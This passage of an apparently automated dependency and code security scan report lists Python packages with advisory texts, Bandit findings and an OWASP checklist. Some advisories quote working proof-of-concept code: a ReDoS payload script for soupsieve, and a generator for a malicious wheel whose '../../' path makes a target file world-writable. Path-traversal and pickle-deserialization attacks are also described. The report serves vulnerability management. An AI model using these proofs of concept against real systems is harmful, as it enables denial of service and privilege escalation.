                                                                                                                                                   #### Mitigation                                                                                                                                                                                                                                                                                  Upgrade to version 0.0.22, or avoid using `UPLOAD_KEEP_FILENAME=True` in project configurations.
  Fix: 0.0.22
[null] python-oxmsg 0.0.2
  null: null
  Fix: No fix available
[null] python-pptx 1.0.2
  null: null
  Fix: No fix available
[null] python-socketio 5.12.1
  PYSEC-2026-1854: ### Summary A remote code execution vulnerability in python-socketio versions prior to 5.14.0 allows attackers to execute arbitrary Python code through malicious pickle deserialization in multi-server deployments on which the attacker previously gained access to the message queue that the servers use for internal communications.  ### Details When Socket.IO servers are configured to use a message queue backend such as Redis for inter-server communication, messages sent between the servers are encoded using the `pickle` Python module. When a server receives one of these messages through the message queue, it assumes it is trusted and immediately deserializes it.  The vulnerability stems from deserialization of messages using Python's `pickle.loads()` function. Having previously obtained access to the message queue, the attacker can send a python-socketio server a crafted pickle payload that executes arbitrary code during deserialization via Python's `__reduce__` method.  ### Impact This vulnerability only affects deployments with a compromised message queue. The attack can lead to the attacker executing random code in the context of, and with the privileges of a Socket.IO server process.   Single-server systems that do not use a message queue, and multi-server systems with a secure message queue are not vulnerable.  ### Remediation In addition to making sure standard security practices are followed in the deployment of the message queue, users of the python-socketio package can upgrade to version 5.14.0 or newer, which remove the `pickle` module and use the much safer JSON encoding for inter-server messaging.
  Fix: 5.14.0
[null] pytokens 0.4.1
  null: null
  Fix: No fix available
[null] pytube 15.0.0
  null: null
  Fix: No fix available
[null] pytz 2025.2
  null: null
  Fix: No fix available
[null] pyxlsb 1.0.10
  null: null
  Fix: No fix available
[null] pyyaml 6.0.2
  null: null
  Fix: No fix available
[null] pyzmq 26.4.0
  null: null
  Fix: No fix available
[null] qdrant-client 1.13.3
  null: null
  Fix: No fix available
[null] rank-bm25 0.2.2
  null: null
  Fix: No fix available
[null] rapidfuzz 3.13.0
  null: null
  Fix: No fix available
[null] rapidocr-onnxruntime 1.4.4
  null: null
  Fix: No fix available
[null] red-black-tree-mod 1.22
  null: null
  Fix: No fix available
[null] redis 5.2.1
  null: null
  Fix: No fix available
[null] referencing 0.36.2
  null: null
  Fix: No fix available
[null] regex 2024.11.6
  null: null
  Fix: No fix available
[null] requests 2.32.3
  PYSEC-2026-1872: ### Impact  Due to a URL parsing issue, Requests releases prior to 2.32.4 may leak .netrc credentials to third parties for specific maliciously-crafted URLs.  ### Workarounds For older versions of Requests, use of the .netrc file can be disabled with `trust_env=False` on your Requests Session ([docs](https://requests.readthedocs.io/en/latest/api/#requests.Session.trust_env)).  ### References https://github.com/psf/requests/pull/6965 https://seclists.org/fulldisclosure/2025/Jun/2
  Fix: 2.32.4
[null] requests-oauthlib 2.0.0
  null: null
  Fix: No fix available
[null] requests-toolbelt 1.0.0
  null: null
  Fix: No fix available
[null] responses 0.25.7
  null: null
  Fix: No fix available
[null] restrictedpython 8.0
  null: null
  Fix: No fix available
[null] rfc3339-validator 0.1.4
  null: null
  Fix: No fix available
[null] rfc3986-validator 0.1.1
  null: null
  Fix: No fix available
[null] rich 14.0.0
  null: null
  Fix: No fix available
[null] rpds-py 0.24.0
  null: null
  Fix: No fix available
[null] rsa 4.9
  null: null
  Fix: No fix available
[null] rtfde 0.1.2
  null: null
  Fix: No fix available
[null] ruamel-yaml 0.19.1
  null: null
  Fix: No fix available
[null] ruff 0.15.11
  null: null
  Fix: No fix available
[null] s3transfer 0.11.4
  null: null
  Fix: No fix available
[null] safetensors 0.5.3
  null: null
  Fix: No fix available
[null] safety 3.7.0
  null: null
  Fix: No fix available
[null] safety-schemas 0.0.16
  null: null
  Fix: No fix available
[null] schedule 1.2.2
  null: null
  Fix: No fix available
[null] scikit-base 0.13.2
  null: null
  Fix: No fix available
[null] scikit-learn 1.6.1
  null: null
  Fix: No fix available
[null] scipy 1.15.2
  null: null
  Fix: No fix available
[null] seaborn 0.13.2
  null: null
  Fix: No fix available
[null] send2trash 2.1.0
  null: null
  Fix: No fix available
[null] sentence-transformers 4.0.2
  null: null
  Fix: No fix available
[null] sentencepiece 0.2.0
  PYSEC-2026-1909: Invalid memory access in Sentencepiece versions less than 0.2.1 when using a vulnerable model file, which is not created in the normal training procedure.
  Fix: 0.2.1
[null] setuptools 75.9.1
  PYSEC-2025-49: ### Summary  A path traversal vulnerability in `PackageIndex` was fixed in setuptools version 78.1.1  ### Details ```     def _download_url(self, url, tmpdir):         # Determine download filename         #         name, _fragment = egg_info_for_url(url)         if name:             while '..' in name:                 name = name.replace('..', '.').replace('\\', '_')         else:             name = "__downloaded__"  # default if URL has no path contents          if name.endswith('.[egg.zip](http://egg.zip/)'):             name = name[:-4]  # strip the extra .zip before download   -->       filename = os.path.join(tmpdir, name) ```  Here: https://github.com/pypa/setuptools/blob/6ead555c5fb29bc57fe6105b1bffc163f56fd558/setuptools/package_index.py#L810C1-L825C88  `os.path.join()` discards the first argument `tmpdir` if the second begins with a slash or drive letter. `name` is derived from a URL without sufficient sanitization. While there is some attempt to sanitize by replacing instances of '..' with '.', it is insufficient.  ### Risk Assessment As easy_install and package_index are deprecated, the exploitation surface is reduced. However, it seems this could be exploited in a similar fashion like https://github.com/advisories/GHSA-r9hx-vwmv-q579, and as described by POC 4 in https://github.com/advisories/GHSA-cx63-2mw6-8hw5 report: via malicious URLs present on the pages of a package index.  ### Impact An attacker would be allowed to write files to arbitrary locations on the filesystem with the permissions of the process running the Python code, which could escalate to RCE depending on the context.  ### References https://huntr.com/bounties/d6362117-ad57-4e83-951f-b8141c6e7ca5 https://github.com/pypa/setuptools/issues/4946
  Fix: 78.1.1
[null] shap 0.51.0
  null: null
  Fix: No fix available
[null] shapely 2.1.0
  null: null
  Fix: No fix available
[null] shellingham 1.5.4
  null: null
  Fix: No fix available
[null] simple-websocket 1.1.0
  null: null
  Fix: No fix available
[null] six 1.17.0
  null: null
  Fix: No fix available
[null] sktime 0.40.1
  null: null
  Fix: No fix available
[null] slicer 0.0.8
  null: null
  Fix: No fix available
[null] smmap 5.0.2
  null: null
  Fix: No fix available
[null] sniffio 1.3.1
  null: null
  Fix: No fix available
[null] sortedcontainers 2.4.0
  null: null
  Fix: No fix available
[null] soundfile 0.13.1
  null: null
  Fix: No fix available
[null] soupsieve 2.6
  CVE-2026-49477: ### Summary  The CSS selector parser in soupsieve (the CSS selector engine for Beautiful Soup 4) contains a regular expression vulnerable to catastrophic backtracking. When processing an attribute selector with an unterminated quoted value, the `VALUE` regex pattern in `css_parser.py` enters exponential backtracking. A payload of only **300 bytes** causes the regex engine to hang for **over 3 seconds**, enabling a trivial Regular Expression Denial of Service (ReDoS) attack.  To be completely transparent, AI tools helped surface this issue. However, this was independently reproduced and carefully validated.  Any application that passes untrusted CSS selector strings to `soupsieve.compile()` or Beautiful Soup's `.select()` / `.select_one()` is affected.  ### Details  **Affected code:** `soupsieve/css_parser.py`, line ~121 - `RE_VALUES` / `VALUE` regex pattern  The soupsieve CSS parser uses a compiled regular expression to tokenise attribute selector values. This pattern matches both quoted strings (`"value"` or `'value'`) and unquoted identifiers. The regex contains alternation branches for:  1. Double-quoted strings: `"[^"\\]*(?:\\.[^"\\]*)*"` 2. Single-quoted strings: `'[^'\\]*(?:\\.[^'\\]*)*'` 3. Unquoted identifiers  When an attribute selector contains an **unterminated quoted value** - e.g., `[a="xxxx...` (opening `"` but no closing `"`) -” the regex engine attempts to match the quoted-string branch. After that branch fails (no closing quote), the engine backtracks and attempts to match the remaining input against subsequent alternation branches and parent patterns. The structure of the pattern causes **catastrophic backtracking** where the number of backtracking steps grows exponentially with the length of the content between the opening quote and the end of the string.  **Root cause:** The regex pattern does not anchor or guard against the case where a quoted string is never terminated. The overlapping character classes across alternation branches create exponential backtracking when the quoted-string branch fails on long input.  **Key characteristics:** - **Input size:** Only 300 bytes are needed to trigger a >3 second hang - **Amplification:** Each additional character approximately doubles the backtracking time - **No memory impact:** The attack consumes CPU only (regex backtracking is compute-bound)  ### Proof of Concept  ```python import time import soupsieve as sv  PAYLOAD_LEN = 300  # Control: well-formed selector with terminated quote (completes instantly) well_formed = '[a="' + ('x' * PAYLOAD_LEN) + '"]' start = time.perf_counter() try:     sv.compile(well_formed) except Exception:     pass control_time = time.perf_counter() - start print(f"Well-formed selector ({len(well_formed)} bytes): {control_time:.4f}s")  # Exploit: unterminated quote triggers catastrophic regex backtracking malformed = '[a="' + ('x' * PAYLOAD_LEN) start = time.perf_counter() try:     sv.compile(malformed)  # WARNING: This will hang for >3 seconds except Exception:     pass exploit_time = time.perf_counter() - start print(f"Malformed selector ({len(malformed)} bytes): {exploit_time:.4f}s")  slowdown = exploit_time / max(control_time, 1e-9) print(f"Slowdown: {slowdown:.0f}x")  # Expected output: # Well-formed selector (306 bytes): ~0.001s # Malformed selector (304 bytes): >3.0s (may need to be killed) # Slowdown: >3000x # # NOTE: On some systems the malformed selector may hang indefinitely. # Use a timeout mechanism (signal.alarm, threading.Timer) when testing. ```  **Safe testing variant with timeout:**  ```python import signal import soupsieve as sv  def timeout_handler(signum, frame):     raise TimeoutError("ReDoS confirmed: regex backtracking exceeded timeout")  PAYLOAD_LEN = 300 malformed = '[a="' + ('x' * PAYLOAD_LEN)  signal.signal(signal.SIGALRM, timeout_handler) signal.alarm(3)  # 3-second timeout  try:     sv.compile(malformed)     print("Selector compiled (not vulnerable)") except TimeoutError as e:     print(f"VULNERABLE: {e}") except Exception as e:     print(f"Other error: {e}") finally:     signal.alarm(0)  # Cancel the alarm ```  ### Impact  **Severity: High**  An attacker can cause CPU exhaustion on any server-side Python application that compiles user-supplied CSS selectors via soupsieve. The attack is particularly dangerous because:  1. **Tiny payload:** Only 300 bytes are needed - well within typical URL parameter, form field, or API request limits 2. **No special characters:** The payload consists entirely of printable ASCII characters (`[a="xxx...`) 3. **Exponential scaling:** Each additional byte approximately doubles the backtracking time, making the attack easily tuneable 4. **Thread blocking:** The regex engine blocks the calling thread with no opportunity for interruption (except via OS signals)  | Parameter | Value | |---|---| | Input size | 300 bytes | | CPU time consumed | >3 seconds (exponential with payload length) | | Memory consumed | Negligible (CPU-only attack) | | Authentication required | None | | User interaction required | None |  **Deployment impact:** In threaded or async web applications, a single malicious request blocks a worker thread for the duration of the backtracking. An attacker can submit multiple concurrent requests to exhaust all available workers, causing complete service denial. The small payload size makes the attack easy to deliver and difficult to detect via request size limits.  **Downstream exposure:** soupsieve is an automatic dependency of `beautifulsoup4`, one of the most widely installed Python packages. Any web application, API, or service that accepts CSS selectors from users is potentially affected.  ---  ### Credit  The vulnerability was discovered by a security research team from the University of Sydney, whose focus is detecting open source software vulnerabilities. Liyi Zhou: https://lzhou1110.github.io/ Ziyue Wang: https://zyy0530.github.io/ Strick: https://str1ckl4nd.github.io/ Maurice: https://maurice.busystar.org/ Chenchen Yu: https://7thparkk.github.io/
  Fix: 2.8.4
[null] sqlalchemy 2.0.40
  null: null
  Fix: No fix available
[null] stack-data 0.6.3
  null: null
  Fix: No fix available
[null] starlette 0.45.3
  PYSEC-2026-161: Starlette reconstructs the requested URL based on the HTTP Host request header and requested path, but does not perform any validation of the Host header value. This allows attackers to inject paths into the host part, prepending the actual path. However, routing in Starlette is based on the actual request path. This inconsistent interpretation of HTTP requests may lead to issues such as authentication bypass when the authentication depends on the reconstructed URL’s path.
  Fix: 1.0.1
[null] statsmodels 0.14.6
  null: null
  Fix: No fix available
[null] stevedore 5.6.0
  null: null
  Fix: No fix available
[null] streamlit 1.52.1
  PYSEC-2026-212: A vulnerability has been found in Streamlit up to 1.53.0. Impacted is an unknown function in the library lib/streamlit/runtime/caching/hashing.py of the component Palette Handler. Such manipulation leads to use of weak hash. Local access is required to approach this attack. The attack requires a high level of complexity. The exploitability is considered difficult. The exploit has been disclosed to the public and may be used. The pull request to fix this issue awaits acceptance.
  Fix: 1.53.1
[null] streamlit-mermaid 0.3.0
  null: null
  Fix: No fix available
[null] sympy 1.13.1
  null: null
  Fix: No fix available
[null] tabulate 0.9.0
  null: null
  Fix: No fix available
[null] tenacity 9.1.2
  null: null
  Fix: No fix available
[null] terminado 0.18.1
  null: null
  Fix: No fix available
[null] threadpoolctl 3.6.0
  null: null
  Fix: No fix available
[null] tiktoken 0.9.0
  null: null
  Fix: No fix available
[null] tinycss2 1.4.0
  null: null
  Fix: No fix available
[null] tokenizers 0.21.1
  null: null
  Fix: No fix available
[null] toml 0.10.2
  null: null
  Fix: No fix available
[null] tomli 2.4.0
  null: null
  Fix: No fix available
[null] tomli-w 1.2.0
  null: null
  Fix: No fix available
[null] tomlkit 0.13.3
  null: null
  Fix: No fix available
[null] toolz 1.1.0
  null: null
  Fix: No fix available
[null] torch 2.6.0
  PYSEC-2025-191: A vulnerability, which was classified as problematic, has been found in PyTorch 2.6.0+cu124. Affected by this issue is the function torch.mkldnn_max_pool2d. The manipulation leads to denial of service. An attack has to be approached locally. The exploit has been disclosed to the public and may be used.
  Fix: 2.7.1rc1
[null] tornado 6.5.2
  PYSEC-2026-140: In versions of Tornado prior to 6.5.5, the only limit on the number of parts in `multipart/form-data` is the `max_body_size` setting (default 100MB). Since parsing occurs synchronously on the main thread, this creates the possibility of denial-of-service due to the cost of parsing very large multipart bodies with many parts.   Tornado 6.5.5 introduces new limits on the size and complexity of multipart bodies, including a default limit of 100 parts per request. These limits are configurable if needed; see `tornado.httputil.ParseMultipartConfig`. It is also now possible to disable `multipart/form-data` parsing entirely if it is not required for the application.
  Fix: 6.5.5
[null] tqdm 4.67.1
  null: null
  Fix: No fix available
[null] traitlets 5.14.3
  null: null
  Fix: No fix available
[null] transformers 4.51.2
  PYSEC-2025-217: Hugging Face Transformers X-CLIP Checkpoint Conversion Deserialization of Untrusted Data Remote Code Execution Vulnerability. This vulnerability allows remote attackers to execute arbitrary code on affected installations of Hugging Face Transformers. User interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file.  The specific flaw exists within the parsing of checkpoints. The issue results from the lack of proper validation of user-supplied data, which can result in deserialization of untrusted data. An attacker can leverage this vulnerability to execute code in the context of the current process. Was ZDI-CAN-28308.
  Fix: No fix available
[null] typer 0.23.1
  null: null
  Fix: No fix available
[null] typing-extensions 4.13.2
  null: null
  Fix: No fix available
[null] typing-inspect 0.9.0
  null: null
  Fix: No fix available
[null] typing-inspection 0.4.0
  null: null
  Fix: No fix available
[null] tzdata 2025.2
  null: null
  Fix: No fix available
[null] tzlocal 5.3.1
  null: null
  Fix: No fix available
[null] ujson 5.10.0
  CVE-2026-32874: #### Summary  ujson 5.4.0 to 5.11.0 inclusive contain an accumulating memory leak in JSON parsing _large_ (outside of the range [-2^63, 2^64 - 1]) integers.  #### Exploitability  Any service that calls `ujson.load()`/`ujson.loads()`/`ujson.decode()` on untrusted inputs is affected and vulnerable to denial of service attacks.  #### Details  The leaked memory is a copy of the string form of the integer plus an additional NULL byte. The leak occurs irrespective of whether the integer parses successfully or is rejected due to having more than `sys.get_int_max_str_digits()` digits, meaning that any sized leak per malicious JSON can be achieved provided that there is no limit on the overall size of the payload.  ```python ujson.loads(str(2 ** 64 - 1))  # No leak ujson.loads(str(2 ** 64))  # Leaks ujson.loads(str(10 ** sys.get_int_max_str_digits()))  # Leaks and raises ValueError ```  #### Fix  The leak is fixed in `ujson 5.12.0` (4baeb950df780092bd3c89fc702a868e99a3a1d2). There are no workarounds beyond upgrading to an unaffected version.  #### Credits  Discovered by Cameron Criswell/Skevros using Coverage-guided fuzzing (libFuzzer + AddressSanitizer)
  Fix: 5.12.0
[null] unstructured 0.17.2
  CVE-2025-64712: A Path Traversal vulnerability in the `partition_msg` function allows an attacker to write or overwrite arbitrary files on the filesystem when processing malicious MSG files with attachments.    ## Impact   An attacker can craft a malicious .msg file with attachment filenames containing path traversal sequences (e.g.,   `../../../etc/cron.d/malicious`). When processed with `process_attachments=True`, the library writes the attachment to an   attacker-controlled path, potentially leading to:    - Arbitrary file overwrite   - Remote code execution (via overwriting configuration files, cron jobs, or Python packages)   - Data corruption   - Denial of service    ## Affected Functionality   The vulnerability affects the MSG file partitioning functionality when `process_attachments=True` is enabled.    ## Vulnerability Details   The library does not sanitize attachment filenames in MSG files before using them in file write operations, allowing directory   traversal sequences to escape the intended output directory.    ## Workarounds   Until patched, users can:   - Set `process_attachments=False` when processing untrusted MSG files   - Avoid processing MSG files from untrusted sources   - Implement additional filename validation before processing
  Fix: 0.18.18
[null] unstructured-client 0.32.3
  null: null
  Fix: No fix available
[null] uri-template 1.3.0
  null: null
  Fix: No fix available
[null] uritemplate 4.1.1
  null: null
  Fix: No fix available
[null] urllib3 2.4.0
  PYSEC-2026-141: urllib3 is an HTTP client library for Python. From 1.23 to before 2.7.0, cross-origin redirects followed from the low-level API via ProxyManager.connection_from_url().urlopen(..., assert_same_host=False) still forward these sensitive headers. This vulnerability is fixed in 2.7.0.
  Fix: 2.7.0
[null] utilsforecast 0.2.16
  null: null
  Fix: No fix available
[null] uuid6 2024.7.10
  null: null
  Fix: No fix available
[null] uvicorn 0.34.0
  null: null
  Fix: No fix available
[null] uvloop 0.21.0
  null: null
  Fix: No fix available
[null] validators 0.34.0
  null: null
  Fix: No fix available
[null] vanguard null
  null: null
  Fix: No fix available
[null] vectorbt 1.0.0
  null: null
  Fix: No fix available
[null] watchfiles 1.0.5
  null: null
  Fix: No fix available
[null] wcwidth 0.6.0
  null: null
  Fix: No fix available
[null] webcolors 25.10.0
  null: null
  Fix: No fix available
[null] webencodings 0.5.1
  null: null
  Fix: No fix available
[null] websocket-client 1.8.0
  null: null
  Fix: No fix available
[null] websockets 15.0.1
  null: null
  Fix: No fix available
[null] werkzeug 3.1.3
  PYSEC-2026-2046: Werkzeug's `safe_join` function allows path segments with Windows device names. On Windows, there are special device names such as `CON`, `AUX`, etc that are implicitly present and readable in every directory. `send_from_directory` uses `safe_join` to safely serve files at user-specified paths under a directory. If the application is running on Windows, and the requested path ends with a special device name, the file will be opened successfully, but reading will hang indefinitely.
  Fix: 3.1.4
[null] wheel 0.45.1
  CVE-2026-24049: ### Summary  - **Vulnerability Type:** Path Traversal (CWE-22) leading to Arbitrary File Permission Modification.    - **Root Cause Component:** wheel.cli.unpack.unpack function.    - **Affected Packages:**      1. wheel (Upstream source)      2. setuptools (Downstream, vendors wheel)    - **Severity:** High (Allows modifying system file permissions).    ### Details   The vulnerability exists in how the unpack function handles file permissions after extraction. The code blindly trusts the filename from the archive header for the chmod operation, even though the extraction process itself might have sanitized the path.   ``` # Vulnerable Code Snippet (present in both wheel and setuptools/_vendor/wheel) for zinfo in wf.filelist:     wf.extract(zinfo, destination)  # (1) Extraction is handled safely by zipfile      # (2) VULNERABILITY:     # The 'permissions' are applied to a path constructed using the UNSANITIZED 'zinfo.filename'.     # If zinfo.filename contains "../", this targets files outside the destination.     permissions = zinfo.external_attr >> 16 & 0o777     destination.joinpath(zinfo.filename).chmod(permissions) ```    ### PoC   I have confirmed this exploit works against the unpack function imported from setuptools._vendor.wheel.cli.unpack.    **Prerequisites:** pip install setuptools    **Step 1: Generate the Malicious Wheel (gen_poc.py)**   This script creates a wheel that passes internal hash validation but contains a directory traversal payload in the file list.   ``` import zipfile import hashlib import base64 import os  def urlsafe_b64encode(data):     """     Helper function to encode data using URL-safe Base64 without padding.     Required by the Wheel file format specification.     """     return base64.urlsafe_b64encode(data).rstrip(b'=').decode('ascii')  def get_hash_and_size(data_bytes):     """     Calculates SHA-256 hash and size of the data.     These values are required to construct a valid 'RECORD' file,     which is used by the 'wheel' library to verify integrity.     """     digest = hashlib.sha256(data_bytes).digest()     hash_str = "sha256=" + urlsafe_b64encode(digest)     return hash_str, str(len(data_bytes))  def create_evil_wheel_v4(filename="evil-1.0-py3-none-any.whl"):     print(f"[Generator V4] Creating 'Authenticated' Malicious Wheel: {filename}")      # 1. Prepare Standard Metadata Content     # These are minimal required contents to make the wheel look legitimate.     wheel_content = b"Wheel-Version: 1.0\nGenerator: bdist_wheel (0.37.1)\nRoot-Is-Purelib: true\nTag: py3-none-any\n"     metadata_content = b"Metadata-Version: 2.1\nName: evil\nVersion: 1.0\nSummary: PoC Package\n"         # 2. Define Malicious Payload (Path Traversal)     # The content doesn't matter, but the path does.     payload_content = b"PWNED by Path Traversal"      # [ATTACK VECTOR]: Target a file OUTSIDE the extraction directory using '../'     # The vulnerability allows 'chmod' to affect this path directly.     malicious_path = "../../poc_target.txt"      # 3. Calculate Hashes for Integrity Check Bypass     # The 'wheel' library verifies if the file hash matches the RECORD entry.     # To bypass this check, we calculate the correct hash for our malicious file.     wheel_hash, wheel_size = get_hash_and_size(wheel_content)     metadata_hash, metadata_size = get_hash_and_size(metadata_content)     payload_hash, payload_size = get_hash_and_size(payload_content)      # 4. Construct the 'RECORD' File     # The RECORD file lists all files in the wheel with their hashes.     # CRITICAL: We explicitly register the malicious path ('../../poc_target.txt') here.     # This tricks the 'wheel' library into treating the malicious file as a valid, verified component.     record_lines = [         f"evil-1.0.dist-info/WHEEL,{wheel_hash},{wheel_size}",         f"evil-1.0.dist-info/METADATA,{metadata_hash},{metadata_size}",         f"{malicious_path},{payload_hash},{payload_size}",  # <-- Authenticating the malicious path         "evil-1.0.dist-info/RECORD,,"     ]     record_content = "\n".join(record_lines).encode('utf-8')      # 5. Build the Zip File     with zipfile.ZipFile(filename, "w") as zf:         # Write standard metadata files         zf.writestr("evil-1.0.dist-info/WHEEL", wheel_content)         zf.writestr("evil-1.0.dist-info/METADATA", metadata_content)         zf.writestr("evil-1.0.dist-info/RECORD", record_content)          # [EXPLOIT CORE]: Manually craft ZipInfo for the malicious file         # We need to set specific permission bits to trigger the vulnerability.         zinfo = zipfile.ZipInfo(malicious_path)                 # Set external attributes to 0o777 (rwxrwxrwx)         # Upper 16 bits: File type (0o100000 = Regular File)         # Lower 16 bits: Permissions (0o777 = World Writable)         # The vulnerable 'unpack' function will blindly apply this '777' to the system file.         zinfo.external_attr = (0o100000 | 0o777) << 16                 zf.writestr(zinfo, payload_content)      print("[Generator V4] Done. Malicious file added to RECORD and validation checks should pass.")  if __name__ == "__main__":     create_evil_wheel_v4() ```    **Step 2: Run the Exploit (exploit.py)**   ``` from pathlib import Path import sys  # Demonstrating impact on setuptools try:     from setuptools._vendor.wheel.cli.unpack import unpack     print("[*] Loaded unpack from setuptools") except ImportError:     from wheel.cli.unpack import unpack     print("[*] Loaded unpack from wheel")  # 1. Setup Target (Read-Only system file simulation) target = Path("poc_target.txt") target.write_text("SENSITIVE CONFIG") target.chmod(0o400) # Read-only print(f"[*] Initial Perms: {oct(target.stat().st_mode)[-3:]}")  # 2. Run Vulnerable Unpack # The wheel contains "../../poc_target.txt". # unpack() will extract safely, BUT chmod() will hit the actual target file. try:     unpack("evil-1.0-py3-none-any.whl", "unpack_dest") except Exception as e:     print(f"[!] Ignored expected extraction error: {e}")  # 3. Check Result final_perms = oct(target.stat().st_mode)[-3:] print(f"[*] Final Perms: {final_perms}")  if final_perms == "777":     print("VULNERABILITY CONFIRMED: Target file is now world-writable (777)!") else:     print("[-] Attack failed.") ```    **result:**   <img width="806" height="838" alt="image" src="https://github.com/user-attachments/assets/f750eb3b-36ea-445c-b7f4-15c14eb188db" />      ### Impact   Attackers can craft a malicious wheel file that, when unpacked, changes the permissions of critical system files (e.g., /etc/passwd, SSH keys, config files) to 777. This allows for Privilege Escalation or arbitrary code execution by modifying now-writable scripts.    ### Recommended Fix   The unpack function must not use zinfo.filename for post-extraction operations. It should use the sanitized path returned by wf.extract().    ### Suggested Patch:   ``` # extract() returns the actual path where the file was written extracted_path = wf.extract(zinfo, destination)  # Only apply chmod if a file was actually written if extracted_path:     permissions = zinfo.external_attr >> 16 & 0o777     Path(extracted_path).chmod(permissions) ```
  Fix: 0.46.2
[null] widgetsnbextension 4.0.15
  null: null
  Fix: No fix available
[null] wrapt 1.17.2
  null: null
  Fix: No fix available
[null] wsproto 1.2.0
  null: null
  Fix: No fix available
[null] xgboost 3.2.0
  null: null
  Fix: No fix available
[null] xlrd 2.0.1
  null: null
  Fix: No fix available
[null] xlsxwriter 3.2.2
  null: null
  Fix: No fix available
[null] xmltodict 0.14.2
  null: null
  Fix: No fix available
[null] xxhash 3.5.0
  null: null
  Fix: No fix available
[null] yarl 1.19.0
  null: null
  Fix: No fix available
[null] yfinance 1.3.0
  null: null
  Fix: No fix available
[null] youtube-transcript-api 1.0.3
  null: null
  Fix: No fix available
[null] zipp 3.21.0
  null: null
  Fix: No fix available
[null] zstandard 0.23.0
  null: null
  Fix: No fix available
```

#### Bandit (Python Code Security)

```
Total Issues: null
High Severity: null
Medium Severity: null
Low Severity: null

Top Issues:
[LOW] B101: Use of assert detected. The enclosed code will be removed when compiling to optimised byte code.
  File: ./tests/truncation/test_truncator.py:251
[LOW] B101: Use of assert detected. The enclosed code will be removed when compiling to optimised byte code.
  File: ./tests/truncation/test_truncator.py:250
[LOW] B101: Use of assert detected. The enclosed code will be removed when compiling to optimised byte code.
  File: ./tests/truncation/test_truncator.py:249
[LOW] B101: Use of assert detected. The enclosed code will be removed when compiling to optimised byte code.
  File: ./tests/truncation/test_truncator.py:241
[LOW] B101: Use of assert detected. The enclosed code will be removed when compiling to optimised byte code.
  File: ./tests/truncation/test_truncator.py:240
```

---

### Secret Detection

*gitleaks not installed - cannot scan for secrets*

Install with:
- macOS: `brew install gitleaks`
- Linux: Download from https://github.com/gitleaks/gitleaks/releases

#### Manual Pattern Check

Checking for common secret patterns...

✅ No obvious secret patterns detected

---

### Common Security Issues

#### Configuration Files

✅ .env handling looks good


#### Dependency Files


---

### OWASP Top 10 Checklist

Manual review recommended for:

- [ ] **A01:2021 – Broken Access Control**
  - Check authorization on all endpoints
  - Verify user permissions

- [ ] **A02:2021 – Cryptographic Failures**
  - Verify encryption for sensitive data
  - Check TLS/SSL configuration

- [ ] **A03:2021 – Injection**
  - SQL injection prevention
  - Command injection prevention

- [ ] **A04:2021 – Insecure Design**
  - Review architecture for security flaws
  - Threat modeling

- [ ] **A05:2021 – Security Misconfiguration**
  - Default credentials changed
  - Unnecessary features disabled

- [ ] **A06:2021 – Vulnerable Components**
  - Dependencies up to date
  - No known vulnerabilities

- [ ] **A07:2021 – Authentication Failures**
  - Strong password policy
  - Multi-factor authentication

- [ ] **A08:2021 – Software and Data Integrity**
  - Code signing
  - Integrity checks

- [ ] **A09:2021 – Security Logging Failures**
  - Adequate logging
  - Log monitoring

- [ ] **A10:2021 – Server-Side Request Forgery**
  - Input validation for URLs
  - Network segmentation

---

## Summary & Recommendations

### Scans Performed

- ✅ Python dependency scan
- ✅ Python code security scan
- ✅ Common security issues check
- ✅ OWASP Top 10 checklist generated

### Immediate Actions

1. **Critical vulnerabilities:** Fix immediately
2. **Secrets:** Remove any exposed secrets
3. **Dependencies:** Update vulnerable packages
4. **Configuration:** Review security settings
5. **OWASP:** Complete manual checklist review

### Tools Status

- ✅ npm (Node.js security)
- ✅ safety (Python security)
- ✅ pip-audit (Python security)
- ✅ bandit (Python code security)
- ❌ gitleaks (not installed)

---

*Generated by security-scan.sh - Part of Bob Shell Knowledge Manager*
